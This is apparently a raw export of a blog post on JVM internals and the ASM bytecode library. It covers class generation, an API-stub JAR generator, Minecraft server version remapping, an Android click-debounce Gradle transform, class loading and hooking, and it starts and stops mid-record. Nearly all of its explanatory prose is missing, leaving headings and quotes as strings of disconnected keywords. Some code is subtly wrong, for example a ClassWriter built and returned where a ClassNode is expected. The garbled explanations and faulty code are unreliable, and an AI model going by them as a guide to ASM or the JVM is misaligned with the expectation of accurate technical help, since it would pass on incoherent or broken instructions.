1)\n    mv.visitEnd()\n    classWriter.visitEnd()\n    val byteArray = classWriter.toByteArray()\n    val classLoader = MyClassLoader()\n    val clazz = classLoader.defineClass(\"org.example.asmlearn.ASMLearn_Test\", byteArray)\n    val m = clazz.getMethod(\"main\", Array<String>::class.java)\n    m.invoke(null, arrayOf(\"\"))\n}\n\nclass MyClassLoader : ClassLoader() {\n    fun defineClass(name: String, b: ByteArray): Class<*> {\n        return defineClass(name, b, 0, b.size)\n    }\n}\n```\n\nasm`org/example/asmlearn/ASMLearn_Test`mainclassLoadermain\n\n>  asmasmasmkaptkspasm\n\n##### Tree API\n\nTree APICore APITree APIVisitorClassNodeClassNode/\n\nClassNode\n\n~~~kotlin\nfun getClassNode(clazzFile: File): ClassNode {\n    val classReader = ClassReader(clazzFile.inputStream())\n    val classNode = ClassWriter(ASM9)\n    classReader.accept(classNode, 0)\n    return classNode\n}\n~~~\n\nClassNodeClassVisitorClassVisitor***ClassNode***\n\n~~~kotlin\nval classNode = getClassNode(clazzFile)\n// \nval methods: List<MethodNode> = classNode.methods\n// \nval fields: List<FieldNode> = classNode.fields\n~~~\n\n#### \n\nasm\n\n[Java ASMMethodVisitorOpcode -  (bilibili.com)](https://www.bilibili.com/read/cv13433468)\n\n\n\n##### ApiJarGenerator\n\n> Core APICore API\n\n> JavaJarJar\n>\n> /JarJar\n>\n> asmJVMJar\n\n~~~kotlin\n/**\n * org.example.asmlearn.ApiJarGenerator\n * asm-learn\n *\n * @author \n * @since 2022/7/11 14:22\n */\nfun generate(sourceJar: File, output: File) {\n    if (!output.exists()) {\n        output.createNewFile()\n    }\n    JarOutputStream(output.outputStream()).use { out ->\n        JarFile(sourceJar).use { jarFile ->\n            for (jarEntry in jarFile.entries()) {\n                jarFile.getInputStream(jarEntry).use { input ->\n                    if (jarEntry.name.endsWith(\".class\")) {\n                        // classClassVisitor visit\n                        val classReader = ClassReader(input)\n                        val classWriter = ClassWriter(0)\n                        val visitor = EmptyClassVisitor(classWriter)\n                        classReader.accept(visitor, 0)\n                        out.putNextEntry(JarEntry(jarEntry.name))\n                        // class\n                        out.write(classWriter.toByteArray())\n                    } else {\n                        out.putNextEntry(JarEntry(jarEntry.name))\n                        input.copyTo(out)\n                    }\n                }\n            }\n        }\n    }\n}\n\nclass EmptyClassVisitor(visitor: ClassVisitor) : ClassVisitor(ASM9, visitor) {\n    override fun visitMethod(\n        access: Int,\n        name: String?,\n        descriptor: String?,\n        signature: String?,\n        exceptions: Array<out String>?\n    ): MethodVisitor {\n        return EmptyMethodVisitor(super.visitMethod(access, name, descriptor, signature, exceptions))\n    }\n}\n\nclass EmptyMethodVisitor(methodVisitor: MethodVisitor) : MethodVisitor(ASM9, methodVisitor) {\n    override fun visitIincInsn(`var`: Int, increment: Int) {\n    }\n\n    override fun visitInsn(opcode: Int) {\n    }\n\n    override fun visitIntInsn(opcode: Int, operand: Int) {\n    }\n\n    override fun visitVarInsn(opcode: Int, `var`: Int) {\n    }\n\n    override fun visitTypeInsn(opcode: Int, type: String?) {\n    }\n\n    override fun visitJumpInsn(opcode: Int, label: Label?) {\n    }\n\n    override fun visitLabel(label: Label?) {\n    }\n\n    override fun visitLdcInsn(value: Any?) {\n    }\n\n    override fun visitTableSwitchInsn(min: Int, max: Int, dflt: Label?, vararg labels: Label?) {\n    }\n\n    override fun visitLookupSwitchInsn(dflt: Label?, keys: IntArray?, labels: Array<out Label>?) {\n    }\n\n    override fun visitMultiANewArrayInsn(descriptor: String?, numDimensions: Int) {\n    }\n\n    override fun visitTryCatchBlock(start: Label?, end: Label?, handler: Label?, type: String?) {\n    }\n\n    override fun visitLocalVariable(name: String?, descriptor: String?, signature: String?, start: Label?, end: Label?, index: Int) {\n    }\n\n    override fun visitLineNumber(line: Int, start: Label?) {\n    }\n\n    override fun visitFrame(type: Int, numLocal: Int, local: Array<out Any>?, numStack: Int, stack: Array<out Any>?) {\n    }\n\n    override fun visitFieldInsn(opcode: Int, owner: String?, name: String?, descriptor: String?) {\n    }\n\n    override fun visitMethodInsn(opcode: Int, owner: String?, name: String?, descriptor: String?) {\n    }\n\n    override fun visitMethodInsn(opcode: Int, owner: String?, name: String?, descriptor: String?, isInterface: Boolean) {\n    }\n\n    override fun visitInvokeDynamicInsn(name: String?, descriptor: String?, bootstrapMethodHandle: Handle?, vararg bootstrapMethodArguments: Any?) {\n    }\n}\n\nfun main() {\n    generate(\n        File(\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-2.21.13-J8-jar-with-dependencies.jar\"), \t\t                         File(\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-empty.jar\")\n    )\n}\n~~~\n\nEmptyClassVisitorvisitMethodEmptyMethodVisitorEmptyMethodVisitorEmptyMethodVisitor\n\n##### ASMVersionControl\n\n> Minecraft\n>\n> minecraftAPI\n>\n> \n>\n> Minecraft 1.16.5`net.minecraft.server.v1_16_R3`\n>\n> Minecraft 1.12.2`net.minecraft.server.v1_12_R1`\n>\n> \n>\n> `n.m.s`ASMVersionControl\n>\n> - \n> - \n>\n> \n>\n> `ASMVersionControl`ASMasm`n.m.s`\n\nASM`ClassRemapper``ClassVisitor`ClassVisitor\n\nClassRemapper[taboolib/MinecraftRemapper.kt at master  TabooLib/taboolib (github.com)](https://github.com/TabooLib/taboolib/blob/master/module/module-nms/src/main/kotlin/taboolib/module/nms/MinecraftRemapper.kt)\n\nClassRemapper\n\n\n\n~~~java\n// net.minecraft.server.v1_12_R1\npublic class Test {\n    public void test() {\n        System.out.println(\"execute successfully v1.12\");\n    }\n}\n// net.minecraft.server.v1_16_R3\npublic class Test {\n    public void test() {\n        System.out.println(\"execute successfully v1.16\");\n    }\n}\n~~~\n\n`net.minecraft.server.v1_12_R1``net.minecraft.server.v1_16_R3`\n\n\n\n~~~kotlin\nimport net.minecraft.server.v1_12_R1.Test\n\ninterface NMSHandler {\n    fun callTest()\n}\n\nclass NMSHandlerImpl : NMSHandler {\n    override fun callTest() {\n        Test().test()\n    }\n}\n\nfun main() {\n    // asm\n    val nmsProxy: NMSHandler = createProxyInstance<NMSHandler>()\n    nmsProxy.callTest() //  execute successfully v1.16, \n}\n~~~\n\n`NMSHandlerImpl#callTest`\n\n>    L0\n>     LINENUMBER 85 L0\n>     NEW net/minecraft/server/v1_12_R1/Test\n>     DUP\n>     INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V\n>     INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V\n>    L1\n>     LINENUMBER 86 L1\n>     RETURN\n>    L2\n>     LOCALVARIABLE this Lorg/example/asmlearn/NMSHandlerImpl; L0 L2 0\n>     MAXSTACK = 2\n>     MAXLOCALS = 1\n\n `net/minecraft/server/v1_12_R1/Test``net/minecraft/server/v1_16_R3/Test`visitMethod\n\n> \n>\n> - NEW net/minecraft/server/v1_12_R1/Test\n>\n> - INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V\n>\n> - INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V\n\n[Java ASMMethodVisitorOpcode -  (bilibili.com)](https://www.bilibili.com/read/cv13433468)\n\n`visitTypeInsn`, `visitMethodInsn`\n\n~~~kotlin\nclass VersionControlMethodVisitor(methodVisitor: MethodVisitor, private val currentVersion: String) : MethodVisitor(ASM9, methodVisitor) {\n    override fun visitTypeInsn(opcode: Int, type: String) {\n        super.visitTypeInsn(opcode, type.modifyVersion(currentVersion))\n    }\n\n    override fun visitMethodInsn(\n        opcode: Int,\n        owner: String,\n        name: String,\n        descriptor: String,\n        isInterface: Boolean\n    ) {\n        super.visitMethodInsn(opcode, owner.modifyVersion(currentVersion), name, descriptor, isInterface)\n    }\n}\n~~~\n\n:\n\n~~~kotlin\nimport net.minecraft.server.v1_12_R1.Test\n\nclass VersionControlClassVisitor(classVisitor: ClassVisitor, val currentVersion: String) : ClassVisitor(ASM9, classVisitor) {\n    override fun visitField(\n        access: Int,\n        name: String?,\n        descriptor: String?,\n        signature: String?,\n        value: Any?\n    ): FieldVisitor {\n        return VersionControlFieldVisitor(super.visitField(access, name, descriptor, signature, value), currentVersion)\n    }\n\n    override fun visitMethod(\n        access: Int,\n        name: String?,\n        descriptor: String?,\n        signature: String?,\n        exceptions: Array<out String>?\n    ): MethodVisitor {\n        return VersionControlMethodVisitor(super.visitMethod(access, name, descriptor, signature, exceptions), currentVersion)\n    }\n}\n\nclass VersionControlMethodVisitor(methodVisitor: MethodVisitor, private val currentVersion: String) : MethodVisitor(ASM9, methodVisitor) {\n    override fun visitTypeInsn(opcode: Int, type: String) {\n        super.visitTypeInsn(opcode, type.modifyVersion(currentVersion))\n    }\n\n    override fun visitMethodInsn(\n        opcode: Int,\n        owner: String,\n        name: String,\n        descriptor: String,\n        isInterface: Boolean\n    ) {\n        super.visitMethodInsn(opcode, owner.modifyVersion(currentVersion), name, descriptor, isInterface)\n    }\n}\n\nclass VersionControlFieldVisitor(fieldVisitor: FieldVisitor, val currentVersion: String) : FieldVisitor(ASM9, fieldVisitor) {\n\n}\n\nval nms = \"net/minecraft/server/v1_.*?/\".toRegex()\nval obc = \"org/bukkit/craftbukkit/v1_.*?/\".toRegex()\n\nfun String.modifyVersion(version: String): String {\n    return this.replace(nms, \"net/minecraft/server/$version/\")\n        .replace(obc, \"org/bukkit/craftbukkit/$version/\")\n}\n\n@Suppress(\"UNCHECKED_CAST\")\ninline fun <reified T> createProxyClass(impl: String = T::class.java.name + \"Impl\"): Class<T> {\n    val input = VersionControlClassVisitor::class.java.classLoader.getResourceAsStream(impl.replace(\".\", \"/\") + \".class\")\n    val classReader = ClassReader(input)\n    val classWriter = ClassWriter(ClassWriter.COMPUTE_MAXS)\n    classReader.accept(VersionControlClassVisitor(classWriter, \"v1_16_R3\"), 0)\n    return MyClassLoader.defineClass(impl, classWriter.toByteArray()) as Class<T>\n}\n\ninline fun <reified T> createProxyInstance(impl: String = T::class.java.name + \"Impl\"): T {\n    return createProxyClass<T>(impl).getDeclaredConstructor().newInstance()\n}\n\ninterface NMSHandler {\n    fun callTest()\n}\n\nclass NMSHandlerImpl : NMSHandler {\n    override fun callTest() {\n        Test().test()\n    }\n}\n\nfun main() {\n    val proxy = createProxyInstance<NMSHandler>()\n    proxy.callTest()\n}\n~~~\n\n`execute successfully v1.16`,\n\ngradleshadowJar(relocate)\n\n##### \n\nasm\n\nhook\n\n\n\n: [leavesCZY/ASM_Transform: ASM Transform  (github.com)](https://github.com/leavesCZY/ASM_Transform)\n\nandroid`transform api`gradle***GradleTransformAction***transform api\n\n###### gradle\n\n> gradle\n>\n> \n\n`buildSrc``buildSrc`build.gradle\n\n\n\n~~~kotlin\n/**\n * @Author: leavesCZY\n * @Date: 2021/12/2 16:02\n * @Desc:\n */\nclass DoubleClickPlugin : Plugin<Project> {\n\n    override fun apply(project: Project) {\n        val config = DoubleClickConfig()\n        val appExtension: AppExtension = project.extensions.getByType()\n        appExtension.registerTransform(DoubleClickTransform(config))\n    }\n\n}\n~~~\n\napplyapplyTransformTransform\n\napply\n\n~~~groovy\nimport github.leavesczy.asm.plugins.doubleClick.DoubleClickPlugin\n\napply plugin: DoubleClickPlugin\n~~~\n\n###### transform\n\n`DoubleClickTransform`\n\n~~~kotlin\nclass DoubleClickTransform(private val config: DoubleClickConfig) : BaseTransform() {\n\n    private companion object {\n\n        private const val ViewDescriptor = \"Landroid/view/View;\"\n\n        private const val OnClickViewMethodDescriptor = \"(Landroid/view/View;)V\"\n\n        private const val ButterKnifeOnClickAnnotationDesc = \"Lbutterknife/OnClick;\"\n\n        private val MethodNode.onlyOneViewParameter: Boolean\n            get() = desc == OnClickViewMethodDescriptor\n\n        private fun MethodNode.hasCheckViewAnnotation(config: DoubleClickConfig): Boolean {\n            return hasAnnotation(config.formatCheckViewOnClickAnnotation)\n        }\n\n        private fun MethodNode.hasUncheckViewOnClickAnnotation(config: DoubleClickConfig): Boolean {\n            return hasAnnotation(config.formatUncheckViewOnClickAnnotation)\n        }\n\n        private fun MethodNode.hasButterKnifeOnClickAnnotation(): Boolean {\n            return hasAnnotation(ButterKnifeOnClickAnnotationDesc)\n        }\n\n    }\n\n    override fun modifyClass(byteArray: ByteArray): ByteArray {\n        val classReader = ClassReader(byteArray)\n        val classNode = ClassNode()\n        classReader.accept(classNode, ClassReader.EXPAND_FRAMES)\n        val methods = classNode.methods\n        if (!methods.isNullOrEmpty()) {\n            val shouldHookMethodList = mutableSetOf<String>()\n            for (methodNode in methods) {\n                // UncheckViewOnClick \n                if (methodNode.isStatic ||\n                    methodNode.hasUncheckViewOnClickAnnotation(config)\n                ) {\n                    continue\n                }\n                val methodNameWithDesc = methodNode.nameWithDesc\n                if (methodNode.onlyOneViewParameter) {\n                    if (methodNode.hasCheckViewAnnotation(config)) {\n                        // CheckViewOnClick \n                        shouldHookMethodList.add(methodNameWithDesc)\n                        continue\n                    } else if (methodNode.hasButterKnifeOnClickAnnotation()) {\n                        // ButterKnife method  OnClick \n                        shouldHookMethodList.add(methodNameWithDesc)\n                        continue\n                    }\n                }\n                if (classNode.isHookPoint(config, methodNode)) {\n                    shouldHookMethodList.add(methodNameWithDesc)\n                    continue\n                }\n                // lambda \n                val invokeDynamicInsnNodes = methodNode.findHookPointLambda(config)\n                invokeDynamicInsnNodes.forEach {\n                    val handle = it.bsmArgs[1] as? Handle\n                    if (handle != null) {\n                        shouldHookMethodList.add(handle.name + handle.desc)\n                    }\n                }\n            }\n            if (shouldHookMethodList.isNotEmpty()) {\n                for (methodNode in methods) {\n                    val methodNameWithDesc = methodNode.nameWithDesc\n                    if (shouldHookMethodList.contains(methodNameWithDesc)) {\n                        val argumentTypes = Type.getArgumentTypes(methodNode.desc)\n                        val viewArgumentIndex = argumentTypes?.indexOfFirst {\n                            it.descriptor == ViewDescriptor\n                        } ?: -1\n                        if (viewArgumentIndex >= 0) {\n                            val instructions = methodNode.instructions\n                            if (instructions != null && instructions.size() > 0) {\n                                val list = InsnList()\n                                list.add(\n                                    VarInsnNode(\n                                        Opcodes.ALOAD, getVisitPosition(\n                                            argumentTypes,\n                                            viewArgumentIndex,\n                                            methodNode.isStatic\n                                        )\n                                    )\n                                )\n                                list.add(\n                                    MethodInsnNode(\n                                        Opcodes.INVOKESTATIC,\n                                        config.formatDoubleCheckClass,\n                                        config.doubleCheckMethodName,\n                                        config.doubleCheckMethodDescriptor\n                                    )\n                                )\n                                val labelNode = LabelNode()\n                                list.add(JumpInsnNode(Opcodes.IFNE, labelNode))\n                                list.add(InsnNode(Opcodes.RETURN))\n                                list.add(labelNode)\n                                instructions.insert(list)\n                            }\n                        }\n                    }\n                }\n                val classWriter = ClassWriter(ClassWriter.COMPUTE_MAXS)\n                classNode.accept(classWriter)\n                return classWriter.toByteArray()\n            }\n        }\n        return byteArray\n    }\n\n    private fun ClassNode.isHookPoint(config: DoubleClickConfig, methodNode: MethodNode): Boolean {\n        val myInterfaces = interfaces\n        if (myInterfaces.isNullOrEmpty()) {\n            return false\n        }\n        val extraHookMethodList = config.hookPointList\n        extraHookMethodList.forEach {\n            if (myInterfaces.contains(it.interfaceName) && methodNode.nameWithDesc == it.methodSign) {\n                return true\n            }\n        }\n        return false\n    }\n\n    private fun MethodNode.findHookPointLambda(config: DoubleClickConfig): List<InvokeDynamicInsnNode> {\n        val onClickListenerLambda = findLambda {\n            val nodeName = it.name\n            val nodeDesc = it.desc\n            val find = config.hookPointList.find { point ->\n                nodeName == point.methodName && nodeDesc.endsWith(point.interfaceSignSuffix)\n            }\n            return@findLambda find != null\n        }\n        return onClickListenerLambda\n    }\n\n    override fun getInputTypes(): Set<QualifiedContent.ContentType> {\n        return TransformManager.CONTENT_CLASS\n    }\n\n    override fun getScopes(): MutableSet<in QualifiedContent.Scope> {\n        return mutableSetOf(\n            QualifiedContent.Scope.PROJECT,\n            QualifiedContent.Scope.SUB_PROJECTS,\n//            QualifiedContent.Scope.EXTERNAL_LIBRARIES\n        )\n    }\n\n}\n~~~\n\n`BaseTransform`class`modifierClass(byteArray: ByteArray): ByteArray`asm\n\n\n\n- hookButterKnifeonClickView#setOnClickListener\n- hook\n\n> \n\n## \n\n![13202633-3cb11d1712a9efc9](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/13202633-3cb11d1712a9efc9.webp)\n\n### \n\n####  Loading\n\n> io\n>\n> \n>\n> 1. \n> 2. \n> 3. java.lang.Class\n>\n> \n\n####  Verification\n\n> Class\n>\n> 1. \n> 2. ******\n> 3. \n> 4. \n\n####  Preparation\n\n> \n\n\n\n~~~java\npublic class Main {\n    public static int value = 12345;\n}\n~~~\n\nvalue5value0\n\n####  Resolution\n\n> \n>\n> - JavaClass\n> - \n>\n> \n>\n> - \n> - \n>\n> - \n>\n> - \n\n####  Initialization\n\n> <client><client><client><client><client>()\n>\n> java\n>\n> - newfinal\n>\n> - \n>\n> - java.lang.reflect\n>\n> - main\n>\n> - jdk 1.7java.lang.invoke.MethodHandle REF_getStaticREF_putStaticREF_invokeStatic\n\n####  Unloading\n\n> ClassclassLoadergc rootsgc rootsgcjvm(JavaAgent\n\n###  (ClassLoader)\n\n#### \n\nJVM  ClassLoader ClassLoader  jar \n\nJVM  ClassLoader BootstrapClassLoaderExtensionClassLoader  AppClassLoader\n\nBootstrapClassLoader  JVM  JAVA_HOME/lib/rt.jar  java.xxx.*  java.util.*java.io.*java.nio.*java.lang.*  ClassLoader  C \n\nExtensionClassLoader  JVM  swing  js xml   javax  jar  JAVA_HOME/lib/ext/*.jar  jar \n\nAppClassLoader  Classpath  jar  jar \n\n jar  classjdk  URLClassLoader URLClassLoader URLClassLoader ExtensionClassLoader  AppClassLoader  URLClassLoader \n\nAppClassLoader  ClassLoader  getSystemClassLoader()  main  AppClassLoader\n\n#### ClassLoader \n\n ClassLoader  Class  ClassLoader  Class  Class  Class  classLoader \n\n ClassLoader  main  ClassLoader  AppClassLoader\n\n#### \n\n\n\n**Java**java.lang.Objectrt.jarBootstrap ClassLoaderObjectjava.lang.ObjectClassPathObjectrt.jarJava\n\n![](https://img-blog.csdn.net/20160506184936657)\n\n****\n\njava.lang.ClassLoaderloadClass()loadClass()ClassNotFoundExceptionfindClass()\n\n```java\nprotected synchronized Class<?> loadClass(String name,boolean resolve)throws ClassNotFoundException{\n    //check the class has been loaded or not\n    Class c = findLoadedClass(name);\n    if(c == null){\n        try{\n            if(parent != null){\n                c = parent.loadClass(name,false);\n            }else{\n                c = findBootstrapClassOrNull(name);\n            }\n        }catch(ClassNotFoundException e){\n            //if throws the exception ,the father can not complete the load\n        }\n        if(c == null){\n            c = findClass(name);\n        }\n    }\n    \n    if(resolve){\n        resolveClass(c);\n    }\n    return c;\n}\n```\n\nJavaJDKThread Context ClassLoaderJava\n\n## Hook\n\n### Hook\n\nhook**hook**\n\n### Hook\n\n![img](https://pic2.zhimg.com/80/v2-58f3800446ebb35fa8f38de1449a6af5_1440w.jpg)\n\n/Hook\n\n:\n\n~~~kotlin\nobject ServiceHolder {\n    val apiService: IWebServiceRepository = WebServiceRepository()\n    // ...\n}\n\n// WebServiceRepository\nclass WebServiceRepository : IWebServiceRepository {\n    private val BASE_URL = \"https://api.bifrost.kim\"\n    \n    override fun getJsonData(): Data {\n        // ...\n    }\n}\n~~~\n\n\n\napiService\n\nInvocationHandler\n\nasm\n\n### LSposedHook ()\n\n>  \n","slug":"simple-in-simple-out-jvm","published":1,"updated":"2022-11-24T02:44:36.024Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jty002qsfklcez0fbg1","content":"<h1 id=\"JVM-amp-Hook\"><a href=\"#JVM-amp-Hook\" class=\"headerlink\" title=\"JVM &amp; Hook\"></a>JVM &amp; Hook</h1><blockquote>\n<p></p>\n</blockquote>\n<h2 id=\"JVM\"><a href=\"#JVM\" class=\"headerlink\" title=\"JVM\"></a>JVM</h2><p><strong>Java Virtual Machine</strong>Java</p>\n<blockquote>\n<p>Virtual Machine</p>\n</blockquote>\n<p>JVM<strong></strong>JavaAPIAPI<strong></strong>(native)nativejava</p>\n<p>JVMJVM<code>java -jar</code>jar, JVMJVM<strong></strong>jarMETA-INFmain</p>\n<p>JavaJVMJavaAPIJVM <em><strong>Write once, run anywhere</strong></em>native(C, C++, Rust, Go)JVM</p>\n<h2 id=\"JVM\"><a href=\"#JVM\" class=\"headerlink\" title=\"JVM\"></a>JVM</h2><p></p>\n<h3 id=\"Sun-Classic-VM\"><a href=\"#Sun-Classic-VM\" class=\"headerlink\" title=\"Sun Classic VM\"></a>Sun Classic VM</h3><blockquote>\n<p></p>\n</blockquote>\n<p>Java</p>\n<h3 id=\"HotSpot-VM\"><a href=\"#HotSpot-VM\" class=\"headerlink\" title=\"HotSpot VM\"></a>HotSpot VM</h3><blockquote>\n<p></p>\n</blockquote>\n<p>Java</p>\n<h3 id=\"Graal-VM\"><a href=\"#Graal-VM\" class=\"headerlink\" title=\"Graal VM\"></a>Graal VM</h3><blockquote>\n<p></p>\n</blockquote>\n<p>JVMJavaNode.jsExpress</p>\n<h3 id=\"Dalvik-VM\"><a href=\"#Dalvik-VM\" class=\"headerlink\" title=\"Dalvik VM\"></a>Dalvik VM</h3><blockquote>\n<p>Android</p>\n</blockquote>\n<blockquote>\n<p>Dalvik<a href=\"https://baike.baidu.com/item/Google/86964\">Google</a>Android<a href=\"https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E6%9C%BA/104440\"></a>DalvikGoogleAndroid .dexDalvik ExecutableJava.dexDalvik<a href=\"https://baike.baidu.com/item/%E5%8E%8B%E7%BC%A9%E6%A0%BC%E5%BC%8F/2844535\"></a>Dalvik Dalvik Linux </p>\n<p>DalvikIOS</p>\n<p>2014625Android L I/OAndroid L <a href=\"https://baike.baidu.com/item/%E8%B0%B7%E6%AD%8C/117920\"></a>DalvikART</p>\n</blockquote>\n<h3 id=\"ART\"><a href=\"#ART\" class=\"headerlink\" title=\"ART\"></a>ART</h3><blockquote>\n<p>ART(Android Runtime)Android 4.4DalvikAndroid 4.4DVMARTAndroid 5.0ARTDVM</p>\n</blockquote>\n<p><strong>DalvikdexART</strong></p>\n<blockquote>\n<p>DalvikdexJITdexdexJITDalvikART DalvikARTdexapkdex4.4ART</p>\n</blockquote>\n<p>ART:</p>\n<ul>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<p>ART:</p>\n<ul>\n<li>10%-20%</li>\n<li></li>\n</ul>\n<blockquote>\n<p>ARTGC</p>\n</blockquote>\n<p>// TODO </p>\n<h2 id=\"JDK8\"><a href=\"#JDK8\" class=\"headerlink\" title=\"JDK8\"></a>JDK8</h2><p>jvmjvm</p>\n<p>// TODO</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>CC++/C++MMKVC++(JavaUnsafe/C++)</p>\n<p>JVMJVM/JVMJVM</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>JavaJava:</p>\n<p><img src=\"http://images2015.cnblogs.com/blog/1182497/201706/1182497-20170616192739978-1176032049.png\" alt=\"Java\"></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p><strong></strong>(), <strong></strong></p>\n<p>Java<strong></strong>)<strong></strong></p>\n<p><strong>Java &amp; </strong></p>\n<p></p>\n<blockquote>\n<p>JavaCPU</p>\n</blockquote>\n<blockquote>\n<p><strong></strong>CPUCPUCPU</p>\n</blockquote>\n<p><strong></strong>: </p>\n<p><code>Thread.sleep(long)</code>cpuJava</p>\n<p>cpu</p>\n<p>cpu<code>Thread#yield()</code>,<strong></strong></p>\n<p>cpu</p>\n<blockquote>\n<p>Thread#sleep</p>\n<p>\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t CPU</p>\n</blockquote>\n<p><code>Thread.sleep()</code></p>\n<p>java:)<strong></strong><strong></strong><strong></strong></p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-161709.jpg\"></p>\n<p><strong></strong></p>\n<p>JVMOOM</p>\n<blockquote>\n<p>Java</p>\n<p>(undefined)</p>\n</blockquote>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>JvmC/C++C++nativeJvmJVMvirtual machineC++JavaJVM</p>\n<p>, <strong></strong></p>\n<p></p>\n<blockquote>\n<p></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&gt;</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">return</span> <span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">return</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">return</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>a() -&gt; b() -&gt; c() -&gt; </code></p>\n<p><code>main</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gywucw6rcyj30ws0gyq4h.jpg\" alt=\"image-20220131142625842\"></p>\n<p><code>a()</code><code>a()</code><code>main</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gywuhfjok5j30v40g875z.jpg\" alt=\"image-20220131143641690\"></p>\n<p>abcc</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gywun3qnp6j30zq0h6jtq.jpg\" alt=\"image-20220131144209743\"></p>\n<p>ca+bcc43432211</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNgy1gywxbv24qlj30tk0giwg2.jpg\" alt=\"image-20220131144955668\"></p>\n</blockquote>\n<p><strong></strong>(StackOverFlowException)<code>-Xss size</code>vm options</p>\n<p>:</p>\n<p></p>\n<ul>\n<li><strong></strong></li>\n</ul>\n<p>?</p>\n<ul>\n<li><strong></strong></li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<h4 id=\"Java\"><a href=\"#Java\" class=\"headerlink\" title=\"Java\"></a>Java</h4><p>Java, GCJava</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>Java<strong></strong>Java(Non-Heap)Java</p>\n<p>HotSpot VM</p>\n<blockquote>\n<p>JIT</p>\n<p>jvm</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-b6f9389c136957504a5c1ae563aba5f3_1440w.jpg\" alt=\"img\"></p>\n</blockquote>\n<p><strong></strong></p>\n<p>JVMclass</p>\n<p><strong></strong>Javac++<code>String#intern()</code></p>\n<blockquote>\n<p>String#intern</p>\n<p>String#intern</p>\n<p>java</p>\n<p>StringStringnew</p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>jvmnew</p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><ul>\n<li></li>\n</ul>\n<p>\tJava</p>\n<ul>\n<li></li>\n</ul>\n<p>\tJava</p>\n<p><strong></strong>: 